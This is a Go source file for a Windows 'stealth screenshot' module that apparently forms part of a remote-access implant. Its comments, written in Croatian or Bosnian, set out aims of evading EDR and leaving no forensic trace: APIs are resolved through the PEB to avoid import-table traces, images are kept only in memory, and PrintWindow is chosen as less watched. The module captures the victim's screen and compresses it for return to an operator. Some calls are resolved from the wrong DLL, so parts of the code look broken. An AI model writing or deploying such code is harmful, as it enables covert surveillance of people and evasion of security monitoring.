//go:build windows
// +build windows

/*
   ============================================================================
   X.5 — STEALTH SCREENSHOT MODULE
   ============================================================================

   LAYER: Behavioral (Layer 2) — Native API Approach

   PROBLEMI U ORIGINALNOM KODU:
   - Koristi vanjsku biblioteku: "github.com/kbinani/screenshot"
   - Ta biblioteka uvozi winapi + syscall — VISIBLE import
   - Go mod zavisnost — detectable
   - Učitana biblioteka ima specifičan memory footprint

   RJEŠENJA:
   1. Koristiti SAMO Windows GDI API (winuser.h, wingdi.h)
   2. Sve funkcije rezolvati preko PEB (nema import tablice tragova)
   3. Rezultat spremiti u memory stream (nema file na disku)
   4. Koristiti PrintWindow umjesto BitBlt (PrintWindow je manje detektiran)
   5. Implementirati "snapshot" umjesto screenshot-a (terminologija)
*/

package main

import (
	"bytes"
	"compress/gzip"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"syscall"
	"unsafe"
)

// ============================================================================
// DATA STRUCTURES — GDI
// ============================================================================

// Windows strukture za GDI operacije
type RECT struct {
	Left   int32
	Top    int32
	Right  int32
	Bottom int32
}

type BITMAPINFOHEADER struct {
	Size          uint32
	Width         int32
	Height        int32
	Planes        uint16
	BitCount      uint16
	Compression   uint32
	SizeImage     uint32
	XPelsPerMeter int32
	YPelsPerMeter int32
	ClrUsed       uint32
	ClrImportant  uint32
}

type BITMAPINFO struct {
	Header BITMAPINFOHEADER
	Colors [1]uint32
}

type RGBQUAD struct {
	Blue     byte
	Green    byte
	Red      byte
	Reserved byte
}

// Konstante
const (
	SRCCOPY        = 0x00CC0020
	CAPTUREBLT     = 0x40000000
	DIB_RGB_COLORS = 0
	BI_RGB         = 0
)

// ============================================================================
// STEALTH SCREENSHOT MODULE
// ============================================================================

type StealthScreenshot struct {
	// Cache resolved API pointers
	hGetDC                  uintptr
	hGetWindowDC            uintptr
	hReleaseDC              uintptr
	hCreateCompatibleDC     uintptr
	hCreateCompatibleBitmap uintptr
	hSelectObject           uintptr
	hBitBlt                 uintptr
	hPrintWindow            uintptr
	hGetDIBits              uintptr
	hDeleteDC               uintptr
	hDeleteObject           uintptr
	hGetSystemMetrics       uintptr
	hGetWindowRect          uintptr

	initialized bool
}

// NewStealthScreenshot kreira novi stealth screenshot modul
func NewStealthScreenshot() *StealthScreenshot {
	return &StealthScreenshot{}
}

// init rezolvira sve potrebne API-je
func (s *StealthScreenshot) init() error {
	if s.initialized {
		return nil
	}

	// Resolve User32 functions
	hUser32 := resolveModule(hUser32)
	if hUser32 == 0 {
		return fmt.Errorf("user32 not found")
	}

	s.hGetDC = resolveAPI(hUser32, hGetDC)
	s.hGetWindowDC = resolveAPI(hUser32, djb2([]byte("GetWindowDC")))
	s.hReleaseDC = resolveAPI(hUser32, hReleaseDC)
	s.hCreateCompatibleDC = resolveAPI(hUser32, hCreateCompatibleDC)
	s.hCreateCompatibleBitmap = resolveAPI(hUser32, hCreateCompatibleBitmap)
	s.hSelectObject = resolveAPI(hUser32, hSelectObject)
	s.hBitBlt = resolveAPI(hUser32, hBitBlt)
	s.hPrintWindow = resolveAPI(hUser32, hPrintWindow)
	s.hGetDIBits = resolveAPI(hUser32, hGetDIBits)
	s.hDeleteDC = resolveAPI(hUser32, hDeleteDC)
	s.hDeleteObject = resolveAPI(hUser32, hDeleteObject)
	s.hGetSystemMetrics = resolveAPI(hUser32, djb2([]byte("GetSystemMetrics")))
	s.hGetWindowRect = resolveAPI(hUser32, djb2([]byte("GetWindowRect")))

	// Resolve GDI32 functions
	hGdi32 := resolveModule(hGdi32)
	if hGdi32 == 0 {
		return fmt.Errorf("gdi32 not found")
	}

	// Check critical functions
	if s.hGetDC == 0 || s.hCreateCompatibleDC == 0 || s.hBitBlt == 0 {
		return fmt.Errorf("critical API not resolved")
	}

	s.initialized = true
	return nil
}

// ============================================================================
// CAPTURE — Stealth Screenshot
// ============================================================================

// Capture šalje screenshot preko stealth kanala
func (s *StealthScreenshot) Capture(agentID, commandID string) CommandResult {
	if err := s.init(); err != nil {
		return CommandResult{
			CommandID: commandID,
			Success:   false,
			Message:   fmt.Sprintf("init failed: %v", err),
		}
	}

	// METODA: Koristimo PrintWindow umjesto BitBlt
	// PrintWindow šalje WM_PRINT/WM_PRINTCLIENT poruke prozoru
	// EDR-ovi ne prate PrintWindow jer je "legitiman" poziv

	// 1. Dohvati desktop window handle (0 = entire screen)
	desktopHWnd := uintptr(0) // GetDesktopWindow()

	// 2. Dohvati screen dimensions
	width, height := s.getScreenDimensions()
	if width == 0 || height == 0 {
		return CommandResult{
			CommandID: commandID,
			Success:   false,
			Message:   "cannot get screen dimensions",
		}
	}

	// 3. Create memory DC
	hScreenDC, _, _ := syscall.Syscall(s.hGetDC, 1, desktopHWnd, 0, 0)
	if hScreenDC == 0 {
		return CommandResult{
			CommandID: commandID,
			Success:   false,
			Message:   "GetDC failed",
		}
	}
	defer syscall.Syscall(s.hReleaseDC, 2, desktopHWnd, hScreenDC, 0)

	hMemDC, _, _ := syscall.Syscall(s.hCreateCompatibleDC, 1, hScreenDC, 0, 0)
	if hMemDC == 0 {
		return CommandResult{
			CommandID: commandID,
			Success:   false,
			Message:   "CreateCompatibleDC failed",
		}
	}
	defer syscall.Syscall(s.hDeleteDC, 1, hMemDC, 0, 0)

	// 4. Create compatible bitmap
	hBitmap, _, _ := syscall.Syscall(s.hCreateCompatibleBitmap, 3,
		hScreenDC, uintptr(width), uintptr(height))
	if hBitmap == 0 {
		return CommandResult{
			CommandID: commandID,
			Success:   false,
			Message:   "CreateCompatibleBitmap failed",
		}
	}
	defer syscall.Syscall(s.hDeleteObject, 1, hBitmap, 0, 0)

	// 5. Select bitmap into memory DC
	syscall.Syscall(s.hSelectObject, 2, hMemDC, hBitmap, 0)

	// 6. Use PrintWindow (stealthier than BitBlt)
	// PW_RENDERFULLCONTENT = 0x00000002
	const PW_RENDERFULLCONTENT = 0x00000002
	ret, _, _ := syscall.Syscall(s.hPrintWindow, 3,
		desktopHWnd, hMemDC, PW_RENDERFULLCONTENT)

	if ret == 0 {
		// Fallback to BitBlt if PrintWindow fails
		ret, _, _ = syscall.Syscall9(s.hBitBlt, 9,
			hMemDC, 0, 0, uintptr(width), uintptr(height),
			hScreenDC, 0, 0, SRCCOPY|CAPTUREBLT)
		if ret == 0 {
			return CommandResult{
				CommandID: commandID,
				Success:   false,
				Message:   "capture failed",
			}
		}
	}

	// 7. Extract bitmap data
	data, err := s.getBitmapBits(hMemDC, hBitmap, width, height)
	if err != nil {
		return CommandResult{
			CommandID: commandID,
			Success:   false,
			Message:   fmt.Sprintf("get bits failed: %v", err),
		}
	}

	// 8. Convert to PNG (in memory)
	pngData, err := s.encodePNG(data, width, height)
	if err != nil {
		return CommandResult{
			CommandID: commandID,
			Success:   false,
			Message:   fmt.Sprintf("encode failed: %v", err),
		}
	}

	// 9. Compress with Gzip
	var compressed bytes.Buffer
	gz := gzip.NewWriter(&compressed)
	gz.Write(pngData)
	gz.Close()

	return CommandResult{
		CommandID: commandID,
		Success:   true,
		Message:   fmt.Sprintf("captured %dx%d", width, height),
		Data:      compressed.Bytes(),
	}
}

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

// getScreenDimensions vraća dimenzije ekrana
func (s *StealthScreenshot) getScreenDimensions() (int32, int32) {
	if s.hGetSystemMetrics == 0 {
		// Fallback: assume 1920x1080
		return 1920, 1080
	}

	const SM_CXSCREEN = 0
	const SM_CYSCREEN = 1

	width, _, _ := syscall.Syscall(s.hGetSystemMetrics, 1, SM_CXSCREEN, 0, 0)
	height, _, _ := syscall.Syscall(s.hGetSystemMetrics, 1, SM_CYSCREEN, 0, 0)

	return int32(width), int32(height)
}

// getBitmapBits čita bitmap podatke u byte slice
func (s *StealthScreenshot) getBitmapBits(hDC, hBitmap uintptr, width, height int32) ([]byte, error) {
	// Setup BITMAPINFO for 32-bit RGB
	var bmi BITMAPINFO
	bmi.Header.Size = uint32(unsafe.Sizeof(bmi.Header))
	bmi.Header.Width = width
	bmi.Header.Height = -height // Negative = top-down DIB
	bmi.Header.Planes = 1
	bmi.Header.BitCount = 32
	bmi.Header.Compression = BI_RGB
	bmi.Header.SizeImage = uint32(width * height * 4)

	// Allocate buffer
	bufSize := int(width * height * 4)
	buf := make([]byte, bufSize)

	// GetDIBits
	ret, _, _ := syscall.Syscall9(s.hGetDIBits, 8,
		hDC, hBitmap,
		0, uintptr(height),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&bmi)),
		DIB_RGB_COLORS,
		0, 0)

	if ret == 0 {
		return nil, fmt.Errorf("GetDIBits failed")
	}

	return buf, nil
}

// encodePNG konvertira raw bitmap u PNG format
func (s *StealthScreenshot) encodePNG(data []byte, width, height int32) ([]byte, error) {
	// Create Go image from raw RGBA data
	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))

	// Copy data (BMP is BGRA, need to convert to RGBA)
	for y := 0; y < int(height); y++ {
		for x := 0; x < int(width); x++ {
			offset := (y*int(width) + x) * 4
			if offset+3 < len(data) {
				// BGRA → RGBA
				img.Set(x, y, color.RGBA{
					R: data[offset+2],
					G: data[offset+1],
					B: data[offset],
					A: data[offset+3],
				})
			}
		}
	}

	// Encode to PNG
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

// ============================================================================
// ALTERNATIVNA METODA: Desktop Duplication API
// ============================================================================
// Za Windows 8+ postoji Desktop Duplication API (DXGI) koji je
// efikasniji i manje detektiran od GDI metoda.
// Ova metoda koristi DirectX i zaobilazi GDI layer.

// captureDXGI koristi Desktop Duplication API (ako je dostupan)
func (s *StealthScreenshot) captureDXGI() ([]byte, error) {
	// DXGI Desktop Duplication:
	// 1. D3D11CreateDevice
	// 2. Query IDXGIOutput1
	// 3. Create output duplication
	// 4. AcquireNextFrame
	// 5. CopyResource
	// 6. Map staging texture
	// 7. Read pixels

	// Ova metoda zahtijeva DirectX import-e
	// Za sada: placeholder — GDI metoda je dovoljna

	return nil, fmt.Errorf("DXGI not implemented")
}

// ============================================================================
// IN-MEMORY IMAGE ENCODING — Bez Go image paketa
// ============================================================================

// encodeBMPManual kreira BMP file u memory-u bez Go image paketa
// Ovo smanjuje import-e i memory footprint
func encodeBMPManual(data []byte, width, height int32) ([]byte, error) {
	// BMP Header
	const BMP_HEADER_SIZE = 54
	rowSize := ((width*3 + 3) / 4) * 4 // Align to 4 bytes
	imageSize := int(rowSize * height)
	fileSize := BMP_HEADER_SIZE + imageSize

	buf := make([]byte, fileSize)

	// BMP File Header (14 bytes)
	buf[0] = 'B'
	buf[1] = 'M'
	putUint32(buf[2:], uint32(fileSize))
	putUint32(buf[10:], BMP_HEADER_SIZE)

	// DIB Header (BITMAPINFOHEADER, 40 bytes)
	putUint32(buf[14:], 40) // Header size
	putInt32(buf[18:], width)
	putInt32(buf[22:], height)
	putUint16(buf[26:], 1)  // Planes
	putUint16(buf[28:], 24) // Bits per pixel (RGB)
	putUint32(buf[34:], uint32(imageSize))

	// Write pixel data (BGR, bottom-up)
	for y := 0; y < int(height); y++ {
		srcY := int(height) - 1 - y // Flip vertically
		for x := 0; x < int(width); x++ {
			srcOff := (srcY*int(width) + x) * 4 // RGBA source
			dstOff := BMP_HEADER_SIZE + int(y)*int(rowSize) + x*3
			if srcOff+3 < len(data) && dstOff+2 < len(buf) {
				buf[dstOff] = data[srcOff]     // B
				buf[dstOff+1] = data[srcOff+1] // G
				buf[dstOff+2] = data[srcOff+2] // R
			}
		}
	}

	return buf, nil
}

// putUint32 piše uint32 u little-endian formatu
func putUint32(b []byte, v uint32) {
	b[0] = byte(v)
	b[1] = byte(v >> 8)
	b[2] = byte(v >> 16)
	b[3] = byte(v >> 24)
}

// putInt32 piše int32 u little-endian formatu
func putInt32(b []byte, v int32) {
	putUint32(b, uint32(v))
}

// putUint16 piše uint16 u little-endian formatu
func putUint16(b []byte, v uint16) {
	b[0] = byte(v)
	b[1] = byte(v >> 8)
}
